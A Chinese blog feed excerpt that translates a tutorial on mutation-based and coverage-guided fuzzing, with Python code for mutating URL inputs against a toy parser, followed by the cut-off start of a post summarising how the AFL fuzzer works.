        <content type="html"><![CDATA[<p><img src="https://image.3001.net/images/20210111/1610358571_5ffc1f2b95e569df29bae.png!small" alt="image-20201005165901975"></p><p>随机生成的输入虽好，但是大多数在语法上是不成立的，因此很快就会被处理程序拒绝掉。为了能让模糊测试有效的进行下去，我们必须增加获得有效输入的几率。基于变异的模糊测试就是这样的一种方法，即对现有输入进行小的更改，这些更改可能仍使输入保持有效，但仍会表现出某些新的行为。在本节中我们一起学习如何创建此类变异，以及如何使用流行的AFL核心概念来引导它们发现新的路径。</p><a id="more"></a><h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h3><ul><li>读者需要对基本的模糊测试结构与过程有所了解（可向前翻看第二章）</li></ul><h3 id="基于变异的模糊测试引擎"><a href="#基于变异的模糊测试引擎" class="headerlink" title="基于变异的模糊测试引擎"></a>基于变异的模糊测试引擎</h3><p>2013年11月，发布了第一版的<a href="http://lcamtuf.coredump.cx/afl/">American Fuzzy Lop</a>（AFL）。从那时起，AFL已成为最成功的模糊测试工具之一，并具有很多分支，例如<a href="https://github.com/mboehme/aflfast">AFLFast</a>，<a href="https://github.com/aflgo/aflgo">AFLGo</a>和<a href="https://github.com/aflsmart/aflsmart">AFLSmart</a>（以后将进行讨论）。AFL使模糊测试成为自动漏洞检测的流行选择，它也是第一个被证明可以在许多对安全性要求很高的真实应用程序中，能够自动检测到漏洞的方法。</p><p><img src="https://i.loli.net/2021/03/19/Ajt2dm6KBwaqkcF.png" alt="image-20210319184733073"></p><p>在本章中，我们将介绍变异模糊测试的基础，接下来的下一章将进一步展示如何将模糊测试引导到特定的代码目标。（定向型模糊测试）</p><h3 id="对URL解析器进行模糊测试"><a href="#对URL解析器进行模糊测试" class="headerlink" title="对URL解析器进行模糊测试"></a>对URL解析器进行模糊测试</h3><p>许多应用程序限定其输入用非常固定的格式，这样才能正常执行后面的功能。例如让我们考虑一个接受URL地址（Web地址）的程序，其接受的url必定要采取有效的格式（即合规的url），以便程序可以正常的处理它。但如果我们采用前几章创建的完全随机生成输入的模糊测试引擎，我们能生成有效url的可能性有多大？</p><p>为了深入探讨这个问题，让我们一起探讨一下正常url的组成：</p><pre><code>scheme://netloc/path?query#fragment</code></pre><ul><li><code>scheme</code> ：指的是所使用的协议，常见的包括<code>http</code>, <code>https</code>, <code>ftp</code>, <code>file</code>…</li><li><code>netloc</code> ：是要连接的主机的名称，例如 <code>www.google.com</code></li><li><code>path</code> ：是在目标主机上的路径，例如 <code>search</code></li><li><code>query</code> ：是键/值对的列表，例如 <code>q=fuzzing</code></li><li><code>fragment</code> ：是检索到的文档中某个位置的标记，例如 <code>#result</code></li></ul><p>在Python中，我们可以使用该<code>urlparse()</code>函数来解析URL并将其分解为各个部分。</p><pre><code class="python">import bookutils</code></pre><pre><code class="python">try:    from urlparse import urlparse      # Python 2except ImportError:    from urllib.parse import urlparse  # Python 3urlparse(&quot;http://www.google.com/search?q=fuzzing&quot;)</code></pre><pre><code class="python">ParseResult(scheme=&#39;http&#39;, netloc=&#39;www.google.com&#39;, path=&#39;/search&#39;, params=&#39;&#39;, query=&#39;q=fuzzing&#39;, fragment=&#39;&#39;)</code></pre><p>我们将看到结果如何将URL的各个部分编码为不同的属性。</p><p>现在让我们假设有一个使用URL作为输入的程序。为简化起见，我们不会让它有太多功能。我们只是让它检查传递的URL的有效性。如果URL有效，则返回True；否则，将引发异常。</p><pre><code class="python">def http_program(url):    supported_schemes = [&quot;http&quot;, &quot;https&quot;]    result = urlparse(url)    if result.scheme not in supported_schemes:        raise ValueError(&quot;Scheme must be one of &quot; + repr(supported_schemes))    if result.netloc == &#39;&#39;:        raise ValueError(&quot;Host must be non-empty&quot;)    # Do something with the URL    return True</code></pre><p>现在让我们开始对<code>http_program()</code>进行模糊测试。为了模糊，我们使用全系打印的ASCII字符，这样<code>:</code>，<code>/</code>和小写字母都包括在内。</p><pre><code class="python">from Fuzzer import fuzzer</code></pre><pre><code class="python">fuzzer(char_start=32, char_range=96)</code></pre><pre><code class="python">&#39;&quot;N&amp;+slk%h\x7fyp5o\&#39;@[3(rW*M5W]tMFPU4\\P@tz%[X?uo\\1?b4T;1bDeYtHx #UJ5w&#125;pMmPodJM,_&#39;</code></pre><p>让我们尝试对1000个随机输入进行模糊测试，看看我们能否取得成功。</p><pre><code class="python">for i in range(1000):    try:        url = fuzzer()        result = http_program(url)        print(&quot;Success!&quot;)    except ValueError:        pass</code></pre><p>获取实际有效的url概率有多大？我们需要以<code>http://</code>或者<code>https://</code>开头的字符串。先来看一下<code>http://</code>的情况：这是七个确定的字符，随机产生这七个字符（字符范围为96个不同字符）的概率是96的7次方分之一，或者表示成</p><pre><code>96 ** 7</code></pre><pre><code>75144747810816</code></pre><p>产生<code>https://</code>的概率更加糟糕，是96的8次方分之一：</p><pre><code>96 ** 8</code></pre><pre><code>7213895789838336</code></pre><p>这样综合一下可能性就是</p><pre><code>likelihood = 1 / (96 ** 7) + 1 / (96 ** 8)likelihood</code></pre><pre><code>1.344627131107667e-14</code></pre><p>那我们平均每产生一条符合上述条件的合格的url所需运行次数就是</p><pre><code>1 / likelihood</code></pre><pre><code>74370059689055.02</code></pre><p>我们来简单衡量一下运行<code>http_program()</code>一次需要多长时间</p><pre><code class="python">from Timer import Timer</code></pre><pre><code class="python">trials = 1000with Timer() as t:    for i in range(trials):        try:            url = fuzzer()            result = http_program(url)            print(&quot;Success!&quot;)        except ValueError:            passduration_per_run_in_seconds = t.elapsed_time() / trialsduration_per_run_in_seconds</code></pre><pre><code class="python">6.241764600008537e-05</code></pre><p>看起来非常的快，不是吗？不幸的是，算上可能的运行次数，结果就比较惊人了。</p><pre><code class="python">seconds_until_success = duration_per_run_in_seconds * (1 / likelihood)seconds_until_success</code></pre><pre><code>4642004058.676655</code></pre><p>转化为</p><pre><code class="python">hours_until_success = seconds_until_success / 3600days_until_success = hours_until_success / 24years_until_success = days_until_success / 365.25years_until_success</code></pre><pre><code class="python">147.09623224442464</code></pre><p>即使我们并行并发，我们仍需要等待数月至数年的时间，就为获得一次成功的样例生成，这基本上和空跑没什么区别。</p><p>只要我们不能产生有效的输入，我们就无法达到任何更深层次的功能，也更谈不上测试功能性和安全性了。</p><h3 id="变异的输入"><a href="#变异的输入" class="headerlink" title="变异的输入"></a>变异的输入</h3><p>与从头开始生成随机字符串的方法不同，变异是指从给定的<strong>有效</strong>输入开始，然后对其进行<strong>变异</strong>操作（突变）。一个<em>突变，</em>在这种情况下是一个简单的字符串操作：比如，插入一个（随机）字符、删除字符，或一个字符的表示翻转了一下。这被称为*<strong>变异模糊测试**<em>-与之前讨论的</em></strong>生成模糊测试***技术相反。</p><p>以下是一些可以帮助入门的变异方法：</p><pre><code class="python">import random</code></pre><pre><code class="python">def delete_random_character(s):    &quot;&quot;&quot;Returns s with a random character deleted&quot;&quot;&quot;    if s == &quot;&quot;:        return s    pos = random.randint(0, len(s) - 1)    # print(&quot;Deleting&quot;, repr(s[pos]), &quot;at&quot;, pos)    return s[:pos] + s[pos + 1:]</code></pre><pre><code class="python">seed_input = &quot;A quick brown fox&quot;for i in range(10):    x = delete_random_character(seed_input)    print(repr(x))</code></pre><pre><code class="python">&#39;A uick brown fox&#39;&#39;A quic brown fox&#39;&#39;A quick brown fo&#39;&#39;A quic brown fox&#39;&#39;A quick bown fox&#39;&#39;A quick bown fox&#39;&#39;A quick brown fx&#39;&#39;A quick brown ox&#39;&#39;A quick brow fox&#39;&#39;A quic brown fox&#39;</code></pre><pre><code class="python">def insert_random_character(s):    &quot;&quot;&quot;Returns s with a random character inserted&quot;&quot;&quot;    pos = random.randint(0, len(s))    random_character = chr(random.randrange(32, 127))    # print(&quot;Inserting&quot;, repr(random_character), &quot;at&quot;, pos)    return s[:pos] + random_character + s[pos:]</code></pre><pre><code class="python">for i in range(10):    print(repr(insert_random_character(seed_input)))</code></pre><pre><code class="python">&#39;A quick brvown fox&#39;&#39;A quwick brown fox&#39;&#39;A qBuick brown fox&#39;&#39;A quick broSwn fox&#39;&#39;A quick brown fvox&#39;&#39;A quick brown 3fox&#39;&#39;A quick brNown fox&#39;&#39;A quick brow4n fox&#39;&#39;A quick brown fox8&#39;&#39;A equick brown fox&#39;</code></pre><pre><code class="python">def flip_random_character(s):    &quot;&quot;&quot;Returns s with a random bit flipped in a random position&quot;&quot;&quot;    if s == &quot;&quot;:        return s    pos = random.randint(0, len(s) - 1)    c = s[pos]    bit = 1 &lt;&lt; random.randint(0, 6)    new_c = chr(ord(c) ^ bit)    # print(&quot;Flipping&quot;, bit, &quot;in&quot;, repr(c) + &quot;, giving&quot;, repr(new_c))    return s[:pos] + new_c + s[pos + 1:]</code></pre><pre><code class="python">for i in range(10):    print(repr(flip_random_character(seed_input)))</code></pre><pre><code class="python">&#39;A quick bRown fox&#39;&#39;A quici brown fox&#39;&#39;A&quot;quick brown fox&#39;&#39;A quick brown$fox&#39;&#39;A quick bpown fox&#39;&#39;A quick brown!fox&#39;&#39;A 1uick brown fox&#39;&#39;@ quick brown fox&#39;&#39;A quic+ brown fox&#39;&#39;A quick bsown fox&#39;</code></pre><p>现在让我们创建一个随机变异器，它随机选择要应用的变异规则：</p><pre><code class="python">def mutate(s):    &quot;&quot;&quot;Return s with a random mutation applied&quot;&quot;&quot;    mutators = [        delete_random_character,        insert_random_character,        flip_random_character    ]    mutator = random.choice(mutators)    # print(mutator)    return mutator(s)</code></pre><pre><code class="python">for i in range(10):    print(repr(mutate(&quot;A quick brown fox&quot;)))</code></pre><pre><code class="python">&#39;A qzuick brown fox&#39;&#39; quick brown fox&#39;&#39;A quick Brown fox&#39;&#39;A qMuick brown fox&#39;&#39;A qu_ick brown fox&#39;&#39;A quick bXrown fox&#39;&#39;A quick brown fx&#39;&#39;A quick!brown fox&#39;&#39;A! quick brown fox&#39;&#39;A quick brownfox&#39;</code></pre><p>现在的想法是，只要开始时有一些有效输入，则可以通过应用上述突变之一来创建更多输入候选，让我们回到URL上。</p><h3 id="URLs变异"><a href="#URLs变异" class="headerlink" title="URLs变异"></a>URLs变异</h3><p>现在让我们回到我们的URL解析问题，创建一个函数<code>is_valid_url()</code>来检查<code>http_program()</code>是否接受输入。</p><pre><code class="python">def is_valid_url(url):    try:        result = http_program(url)        return True    except ValueError:        return False</code></pre><pre><code class="python">assert is_valid_url(&quot;http://www.google.com/search?q=fuzzing&quot;)assert not is_valid_url(&quot;xyzzy&quot;)</code></pre><p>现在让我们在给定的URL上应用该函数<code>mutate()</code>，并查看获得了多少有效输入。</p><pre><code class="python">seed_input = &quot;http://www.google.com/search?q=fuzzing&quot;valid_inputs = set()trials = 20for i in range(trials):    inp = mutate(seed_input)    if is_valid_url(inp):        valid_inputs.add(inp)</code></pre><p>现在我们可以观察到，通过对原始输入进行<em>变异</em>可以得到很大一部分的有效输入：</p><pre><code class="python">len(valid_inputs) / trials</code></pre><pre><code>0.8</code></pre><p>通过变异<code>http:</code>样本种子输入来产生<code>https:</code>    前缀的几率是多少？我们必须在正确的位置(1:l)插入 (1:3）正确的字符‘s’(1:96)，平均下来概率需要运行的次数应该是</p><pre><code>trials = 3 * 96 * len(seed_input)trials</code></pre><pre><code>10944</code></pre><p>这个运行的量级我们应该可以承担，我们试试吧：</p><pre><code class="python">from Timer import Timer</code></pre><pre><code class="python">trials = 0with Timer() as t:    while True:        trials += 1        inp = mutate(seed_input)        if inp.startswith(&quot;https://&quot;):            print(                &quot;Success after&quot;,                trials,                &quot;trials in&quot;,                t.elapsed_time(),                &quot;seconds&quot;)            break</code></pre><pre><code class="python">Success after 3656 trials in 0.011846093000258406 seconds</code></pre><p>当然，如果我们想获得一个<code>&quot;ftp://&quot;</code>前缀，我们将需要更多的变异和更多的运行次数—但最重要的还是需要应用<em>多个</em>变异。</p><h3 id="多种变异"><a href="#多种变异" class="headerlink" title="多种变异"></a>多种变异</h3><p>到目前为止，我们仅对样本字符串应用了一个突变。但是，我们也可以应用<em>多个</em>突变，以进一步对其进行更改。例如，如果我们在样本字符串上应用20个突变，会发生什么情况？</p><pre><code class="python">seed_input = &quot;http://www.google.com/search?q=fuzzing&quot;mutations = 50</code></pre><pre><code class="python">inp = seed_inputfor i in range(mutations):    if i % 5 == 0:        print(i, &quot;mutations:&quot;, repr(inp))    inp = mutate(inp)</code></pre><pre><code class="python">0 mutations: &#39;http://www.google.com/search?q=fuzzing&#39;5 mutations: &#39;http:/L/www.googlej.com/seaRchq=fuz:ing&#39;10 mutations: &#39;http:/L/www.ggoWglej.com/seaRchqfu:in&#39;15 mutations: &#39;http:/L/wwggoWglej.com/seaR3hqf,u:in&#39;20 mutations: &#39;htt://wwggoVgle&quot;j.som/seaR3hqf,u:in&#39;25 mutations: &#39;htt://fwggoVgle&quot;j.som/eaRd3hqf,u^:in&#39;30 mutations: &#39;htv://&gt;fwggoVgle&quot;j.qom/ea0Rd3hqf,u^:i&#39;35 mutations: &#39;htv://&gt;fwggozVle&quot;Bj.qom/eapRd[3hqf,u^:i&#39;40 mutations: &#39;htv://&gt;fwgeo6zTle&quot;Bj.\&#39;qom/eapRd[3hqf,tu^:i&#39;45 mutations: &#39;htv://&gt;fwgeo]6zTle&quot;BjM.\&#39;qom/eaR[3hqf,tu^:i&#39;</code></pre><p>如您所见，原始种子输入几乎无法识别。通过一次又一次地改变输入，我们得到了更高的输入多样性。</p><p>为了在单个程序包中实现这样的多个变异，让我们建一个<code>MutationFuzzer</code>类。它需要种子（字符串列表）以及最小和最大数量的突变。</p><pre><code class="python">from Fuzzer import Fuzzer</code></pre><pre><code class="python">class MutationFuzzer(Fuzzer):    def __init__(self, seed, min_mutations=2, max_mutations=10):        self.seed = seed        self.min_mutations = min_mutations        self.max_mutations = max_mutations        self.reset()    def reset(self):        self.population = self.seed        self.seed_index = 0</code></pre><p>下面让我们通过添加更多方法来进一步开发<code>MutationFuzzer</code>。Python语言要求我们将整个方法定义为单个连续单元；但是，我们想介绍一种方法，每当我们想向某个类引入新方法C时，我们都使用构造：</p><pre><code class="python">class C(C):    def new_method(self, args):        pass</code></pre><p>这使我们得到的是<code>C</code>带有<code>new_method()</code>方法的类，这正是我们想要的。</p><p>使用此技巧，我们现在可以添加一个<code>mutate()</code></p><pre><code class="python">class MutationFuzzer(MutationFuzzer):    def mutate(self, inp):        return mutate(inp)</code></pre><p>让我们回到我们的策略，最大程度地<em>扩大</em>我们样例的<em>覆盖范围</em>。首先，让我们创建一个方法<code>create_candidate()</code>，该方法从当前（<code>self.population</code>）中随机选择一些输入，然后在<code>min_mutations</code>和<code>max_mutations</code>之间变异步骤应用，返回最终结果：</p><pre><code class="python">class MutationFuzzer(MutationFuzzer):    def create_candidate(self):        candidate = random.choice(self.population)        trials = random.randint(self.min_mutations, self.max_mutations)        for i in range(trials):            candidate = self.mutate(candidate)        return candidate</code></pre><p>该<code>fuzz()</code>方法设置为首先使用seed；当这些用完后，我们进行变异：</p><pre><code class="python">class MutationFuzzer(MutationFuzzer):    def fuzz(self):        if self.seed_index &lt; len(self.seed):            # Still seeding            self.inp = self.seed[self.seed_index]            self.seed_index += 1        else:            # Mutating            self.inp = self.create_candidate()        return self.inp</code></pre><pre><code class="python">seed_input = &quot;http://www.google.com/search?q=fuzzing&quot;mutation_fuzzer = MutationFuzzer(seed=[seed_input])mutation_fuzzer.fuzz()</code></pre><pre><code>&#39;http://www.google.com/search?q=fuzzing&#39;</code></pre><pre><code>mutation_fuzzer.fuzz()</code></pre><pre><code>&#39;http://www.gogl9ecom/earch?qfuzzing&#39;</code></pre><pre><code>mutation_fuzzer.fuzz()</code></pre><pre><code>&#39;htotq:/www.googleom/yseach?q=fzzijg&#39;</code></pre><p>每次调用新的<code>fuzz()</code>，我们都会得到另一个不同的应用了多个变异的变体样本。但是，输入的多样性变高同时也会增加输入无效的风险。成功的关键在于<em>指导</em>这些变异的想法，即如何<em>保持那些特别有价值的</em>变异<em>。</em></p><h3 id="使用覆盖率引导"><a href="#使用覆盖率引导" class="headerlink" title="使用覆盖率引导"></a>使用覆盖率引导</h3><p>为了覆盖尽可能多的功能，可以依靠之前覆盖率一章中讨论的功能。现在，我们<em>将</em>假设待测试的程序可以利用其结构来指导新测试样例的生成。</p><p>问题是：<em>我们如何利用覆盖率来指导测试样例的产生？</em></p><p>在著名模糊器中一种特别成功的想法实现了，该<a href="http://lcamtuf.coredump.cx/afl/">模糊</a>器名为<a href="http://lcamtuf.coredump.cx/afl/">American Fuzzy lop</a>，简称<em>AFL</em>。就像上面的示例一样，AFL会生成有效的测试用例—但是对于AFL而言，“有效”意味着<em>在程序执行过程中寻找新的途径</em>。这样，AFL可以继续变异到目前为止已经找到新路径的输入；如果输入找到另一条路径，它也会保留该路径。</p><p>让我们来尝试一下，首先介绍一个<code>Runner</code>类，该类捕获给定功能的覆盖范围。第一步。<code>FunctionRunner</code>的类：</p><pre><code>from Fuzzer import Runner</code></pre><pre><code class="python">class FunctionRunner(Runner):    def __init__(self, function):        &quot;&quot;&quot;Initialize.  `function` is a function to be executed&quot;&quot;&quot;        self.function = function    def run_function(self, inp):        return self.function(inp)    def run(self, inp):        try:            result = self.run_function(inp)            outcome = self.PASS        except Exception:            result = None            outcome = self.FAIL        return result, outcome</code></pre><pre><code class="python">http_runner = FunctionRunner(http_program)http_runner.run(&quot;https://foo.bar/&quot;)</code></pre><pre><code class="python">(True, &#39;PASS&#39;)</code></pre><p>现在，我们可以扩展<code>FunctionRunner</code>该类，以便它也可以测量覆盖率。调用<code>run()</code>之后，该<code>coverage()</code>方法将返回上次运行时获得的覆盖率。</p><pre><code class="python">from Coverage import Coverage, population_coverage</code></pre><pre><code class="python">class FunctionCoverageRunner(FunctionRunner):    def run_function(self, inp):        with Coverage() as cov:            try:                result = super().run_function(inp)            except Exception as exc:                self._coverage = cov.coverage()                raise exc        self._coverage = cov.coverage()        return result    def coverage(self):        return self._coverage</code></pre><pre><code class="python">http_runner = FunctionCoverageRunner(http_program)http_runner.run(&quot;https://foo.bar/&quot;)</code></pre><pre><code class="python">(True, &#39;PASS&#39;)</code></pre><p>以下是前五个被覆盖到的位置：</p><pre><code class="python">print(list(http_runner.coverage())[:5])</code></pre><pre><code class="python">[(&#39;http_program&#39;, 2), (&#39;__new__&#39;, 14), (&#39;urlparse&#39;, 368), (&#39;_coerce_args&#39;, 119), (&#39;urlsplit&#39;, 421)]</code></pre><p>现在是主要的class类了。我们维护了数量，并且已经实现了一系列覆盖范围（<code>coverages_seen</code>）。该<code>fuzz()</code>辅助函数接受一个输入和运行给定的<code>function()</code>就可以了。如果其覆盖范围是新的（即，不在中<code>coverages_seen</code>），则将输入添加到<code>population</code>，并将覆盖范围添加到<code>coverages_seen</code>。</p><pre><code class="python">class MutationCoverageFuzzer(MutationFuzzer):    def reset(self):        super().reset()        self.coverages_seen = set()        # Now empty; we fill this with seed in the first fuzz runs        self.population = []    def run(self, runner):        &quot;&quot;&quot;Run function(inp) while tracking coverage.           If we reach new coverage,           add inp to population and its coverage to population_coverage        &quot;&quot;&quot;        result, outcome = super().run(runner)        new_coverage = frozenset(runner.coverage())        if outcome == Runner.PASS and new_coverage not in self.coverages_seen:            # We have new coverage            self.population.append(self.inp)            self.coverages_seen.add(new_coverage)        return result</code></pre><p>现在让我们使用它：</p><pre><code class="python">seed_input = &quot;http://www.google.com/search?q=fuzzing&quot;mutation_fuzzer = MutationCoverageFuzzer(seed=[seed_input])mutation_fuzzer.runs(http_runner, trials=10000)mutation_fuzzer.population</code></pre><pre><code class="python">[&#39;http://www.google.com/search?q=fuzzing&#39;, &#39;http://www.goog.com/search;q=fuzzilng&#39;, &#39;http://ww.6goog\x0eoomosearch;/q=f&#125;zzilng&#39;, &#39;http://uv.Lboo.comoseakrch;q=fuzilng&#39;, &quot;http://www.oogle.com/search?q=fuzzin&#39;&quot;, &#39;http://ww.6goog\x0eo/mosarch;/q=f&#125;z&#123;il~g&#39;, &#39;Http://www.g/ogle.com/earchq=fuzzing&#39;, &quot;httP://www.o/gle.coM-search?q=fuzzin&#39;&quot;, &#39;Http://wwv.gogle.com/kea;rchzq=fuzz&#39;, &#39;Http://wwv.wogle.comkea;rahzq=fuzz&#39;, &#39;Http://wwv.wgle.#omke;rahzq=fuzz&#39;, &#39;hTtp://ww.6gogg\x0eo/mksarch;/u=f&#125;zshl|g&#39;, &#39;htTP://www.o/gle.coMR$search?q=fuzrin#&#39;, &#39;hTtp://ww.6eogg\x0eo/mksarch;/u=fzsl|g&#39;, &#39;htTP://ww.o/gle.hcoMR$search?q=fuzrin#&#39;, &#39;http://ww.6goo#f\x0eo/mosarch;/q=f&#125;z&#123;il~g&#39;, &#39;Http://w7wBv.wogle.comkea;rahq=uzz&#39;, &#39;http://fww.6go\x0eo\x7f/mosrch;/q=f&#125;z&#123;cil~g&#39;, &#39;htTP://www.o/gle.coMR$sear#h?q=fuzrij#&#39;, &#39;http://www.goog.comll/search;Jq=fuzzi,g&#39;, &#39;http://www.goog\x0eom/sea7rch;#q=fuezzi-mog&#39;, &#39;http://ww.6googC\x0eoomos@earch;/q=f&#125;zzilng&#39;, &quot;hTtp://2ww.6eogg\x0eo/mks\\ach\x1b&#39;u=fzsl|g&quot;, &#39;http://ww.6g8mo#\x0eo/m%osarch;/q=f&#125;z&#123;il~g&#39;, &quot;httP://ww(wao/gleR.coM-search?q=uz)n&#39;T&quot;, &#39;http://fww6go\x0eo\x7f/moqsrsh;/q&lt;fx&#125;z&#123;ci?~g&#39;, &#39;http://fw6go\x0eo\x7f/oqs\\rsh;Ea&lt;fx&#125;z&#123;ci?~g&#39;, &#39;htTp://www./gle.coMR$se;a&gt;rchq=fuzrin#&#39;, &#39;http://fww6go\x0eo\x7f/m/qsrs;oq&lt;fx&#125;z&#123;ci?~g&#39;, &#39;http://wwgoog\x0eom/sea7rch;#q=fuezzi-mog&#39;, &#39;hTtp://ww.6ggogg\x0eo/mksach;/u=f&#125;?zshl|g&#39;, &#39;htTp://www./gle.co$se;a&gt;rkhq=fuzrin#&#39;, &#39;hTtp://ww.6gog\x0eo/mksrch;e=fzshl|g&#39;, &#39;hTtp://ww.6ggoPgg\x0eo/m0ksach;+u9&#125;?zshl|g&#39;, &#39;hTtp://ww.6ggogg\x0eo/msch;/u=f&#125;?zshth|g&#39;, &#39;http://fw36go\x0eo/moqsRZh;/q&lt;fx&#125;~[ci?~g&#39;, &#39;http://www.kgle.com/serch?q=fOuzzi#&#39;, &#39;http://wwgoo\x0eoM/se7rch;/#q=ruezzi-mog&#39;, &#39;http://ww.6oog\x0eoomos@garch;2q=f&#125;zzilng&#39;, &#39;hTtp://ww.6ggoPgge\x0eo/m9ksacoh;+u9&#125;?zshl|g&#39;, &#39;htTp://www./gle.wco$se;?a&gt;rkhq=buzrin#&#39;, &#39;htTp://www./g,e.wco$s;?sa&gt;rkhqbuzri.#&#39;, &#39;hTtp://ww.6gogg\x0eo/mksarh;/u=v&#125;zsh#l|g&#39;, &quot;hTtp://ww.6gogg\x0eo/mks&#39;arh;/u=v&gt;s`#l|g&quot;]</code></pre><p>成功！在我们的数量中，<em>每个输入</em>现在都是有效的，并且覆盖范围不同，覆盖范围来自各种组合。</p><pre><code class="python">all_coverage, cumulative_coverage = population_coverage(    mutation_fuzzer.population, http_program)</code></pre><pre><code class="python">import matplotlib.pyplot as plt</code></pre><pre><code class="python">plt.plot(cumulative_coverage)plt.title(&#39;Coverage of urlparse() with random inputs&#39;)plt.xlabel(&#39;# of inputs&#39;)plt.ylabel(&#39;lines covered&#39;);</code></pre><p><img src="https://i.loli.net/2021/03/19/u72rwWiApkNfTz3.png" alt="image-20210319205621075"></p><p>这种策略的好处是，将其应用于较大的程序后，将很乐于探索路径，即一条接一条地进行。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>随机生成的输入通常是无效的，因此需要输入处理功能。</li><li>在有效输入上的变异具有较高的成功概率。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
            <tag> 新趋势 </tag>
            
            <tag> Fuzzbook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模糊测试之AFL总结</title>
      <link href="2021/03/04/AFL/"/>
      <url>2021/03/04/AFL/</url>
      
        <content type="html"><![CDATA[<p>本文是对于模糊测试方面的小总结，计划三篇；第一篇概述；第二篇afl；第三篇Winafl。非大部头书，只提取关键信息。<br>本篇为第二篇：afl。</p><a id="more"></a><h2 id="Part-2-总览"><a href="#Part-2-总览" class="headerlink" title="Part 2 总览"></a>Part 2 总览</h2><ul><li><p>什么是AFL</p></li><li><p>它是如何工作的？</p></li><li><p>Fork 模式 VS 持久性（Persistent）模式</p></li><li><p>模糊测试策略</p></li><li><p>Sanitizers（消毒剂？）—— ASAN,UBSAN, MSAN,TSAN</p></li><li><p>使用AFL（练习）</p><ul><li>如何编译一个简单的C程序？</li><li>对一个简单的C程序进行AFL模糊测试</li><li>RCA 根本原因分析</li><li>崩溃（Crash）分类</li></ul></li><li><p>使用AFL模糊测试真实世界的程序</p><ul><li>使用AFL模糊测试一个开源软件</li></ul></li><li><p>总结</p></li></ul><h2 id="什么是AFL？"><a href="#什么是AFL？" class="headerlink" title="什么是AFL？"></a>什么是AFL？</h2><ul><li>American Fuzzy Lop</li><li>由Michael Zelwaski创建的</li><li>一种由插桩后覆盖率引导的Fuzzer</li><li>编译后附带一套实用程序：<ul><li><u><strong>afl-fuzz, afl-cmin</strong></u>, afl-tmin, afl-showmapetc..</li></ul></li><li>Fork server模式/Persistent mode模式<ul><li>Fork server mode —— 不断创建进程的副本</li><li>Persistentmode —— 着重于一个程序疯狂循环</li></ul></li><li>根据各种策略对文件进行突变<ul><li>Bitflip, byteflip, havoc, splice etc.</li></ul></li></ul><h2 id="它是如何工作的？"><a href="#它是如何工作的？" class="headerlink" title="它是如何工作的？"></a>它是如何工作的？</h2><ul><li><p>在编译时使用特殊的方法插桩</p></li><li><p>它提供自带的编译器包装器（wrapper）</p><ul><li>afl-gcc,afl-g++, afl-clang, afl-clang++, afl-clang-fast, afl-clang-fast++</li></ul></li><li><p>使用二进制重写技术</p><ul><li>在每个基础块（BB块）上进行插桩<ul><li>每个基本块都有一个唯一的随机ID</li></ul></li></ul></li><li><p>其插桩可以由以下伪代码所表示：</p></li></ul><p><img src="https://i.loli.net/2021/03/05/dNFBDXAwOotbkiI.png" alt="image-20210305150453876"></p><ul><li>A → B →C → D→ E 与 A → B → D → C→ E</li></ul><p><img src="https://i.loli.net/2021/03/05/xGfhsMRTHWivyLJ.png" alt="image-20210305150532627"></p><h2 id="Fork-模式-VS-持久性（Persistent）模式"><a href="#Fork-模式-VS-持久性（Persistent）模式" class="headerlink" title="Fork 模式 VS 持久性（Persistent）模式"></a>Fork 模式 VS 持久性（Persistent）模式</h2><ul><li><p>Fork 模式 </p><ul><li>在main（）函数处停止</li><li>使用fork创建程序的克隆</li><li>处理输入input 并创建另一个克隆</li><li>节省初始化程序的时间，从而提高速度</li><li>Ref: <a href="https://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html">https://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html</a></li></ul></li><li><p>持久性（Persistent）模式</p><ul><li>不断使用fork仍然消耗很大</li><li>每次运行后并不需要杀死子进程</li><li>使用 <strong><u>in process</u></strong> 模糊测试 （类似libfuzzer？）</li><li>需要编写一个线束（harness）程序</li></ul><p><img src="https://i.loli.net/2021/03/05/i6rfZ13CcBNQFoW.png" alt="image-20210305151351134"></p><ul><li>Ref: <a href="https://lcamtuf.blogspot.com/2015/06/new-in-afl-persistent-mode.html">https://lcamtuf.blogspot.com/2015/06/new-in-afl-persistent-mode.html</a></li></ul></li></ul><h2 id="模糊测试策略"><a href="#模糊测试策略" class="headerlink" title="模糊测试策略"></a>模糊测试策略</h2><ul><li>bitflip，按位翻转，1变为0，0变为1<ul><li>1/1,2/1,4/1,8/8 ….32/8<ul><li><code>STAGE_FLIP1</code> 每次翻转一位(<code>1 bit</code>)，按一位步长从头开始。<br><code>STAGE_FLIP2</code> 每次翻转相邻两位(<code>2 bit</code>)，按一位步长从头开始。<br><code>STAGE_FLIP4</code> 每次翻转相邻四位(<code>4 bit</code>)，按一位步长从头开始。<br><code>STAGE_FLIP8</code> 每次翻转相邻八位(<code>8 bit</code>)，按八位步长从头开始，也就是说，每次对一个byte做翻转变化。<br><code>STAGE_FLIP16</code>每次翻转相邻十六位(<code>16 bit</code>)，按八位步长从头开始，每次对一个word做翻转变化。<br><code>STAGE_FLIP32</code>每次翻转相邻三十二位(<code>32 bit</code>)，按八位步长从头开始，每次对一个dword做翻转变化。</li></ul></li></ul></li><li>arithmetic，整数加/减算术运算</li><li>interest，把一些特殊内容替换到原文件中</li><li>dictionary，把自动生成或用户提供的token替换/插入到原文件中</li><li>havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异</li><li>splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件</li></ul><p>其中，前四项bitflip, arithmetic, interest, dictionary是非dumb mode（<code>-d</code>）和主fuzzer（<code>-M</code>）会进行的操作，由于其变异方式没有随机性，所以也称为deterministic fuzzing；havoc和splice则存在随机性，是所有状况的fuzzer（是否dumb mode、主从fuzzer）都会执行的变异。</p><ul><li>Ref: <a href="https://github.com/google/AFL/blob/master/docs/technical_details.txt">https://github.com/google/AFL/blob/master/docs/technical_details.txt</a></li></ul><h2 id="Sanitizers（消毒剂？）"><a href="#Sanitizers（消毒剂？）" class="headerlink" 